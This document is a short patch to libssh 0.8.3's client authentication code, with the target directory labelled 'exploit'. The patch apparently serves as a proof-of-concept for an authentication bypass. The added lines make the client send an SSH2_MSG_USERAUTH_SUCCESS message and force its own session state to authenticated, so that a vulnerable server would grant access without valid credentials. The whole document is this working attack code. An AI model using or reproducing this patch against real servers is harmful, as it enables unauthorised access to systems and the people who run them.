--- libssh-0.8.3/src/auth.c	2018-09-19 14:52:59.000000000 +0000
+++ exploit-libssh-0.8.3/src/auth.c	2018-10-19 00:04:33.303662298 +0000
@@ -139,6 +139,16 @@
 
     rc = ssh_handle_packets_termination(session, SSH_TIMEOUT_USER,
         ssh_auth_response_termination, session);
+
+    // inject a successful authentication anyway
+    ssh_buffer_pack(session->out_buffer, "bsss",SSH2_MSG_USERAUTH_SUCCESS,session->opts.username,"ssh-connection","none");
+    ssh_packet_send(session);
+    session->auth.state = SSH_AUTH_STATE_SUCCESS;
+    session->session_state = SSH_SESSION_STATE_AUTHENTICATED;
+    session->flags |= SSH_SESSION_FLAG_AUTHENTICATED;
+    ssh_reset_error(session);
+    session->auth.current_method = SSH_AUTH_METHOD_UNKNOWN;
+
     if (rc == SSH_ERROR) {
         return SSH_AUTH_ERROR;
     }
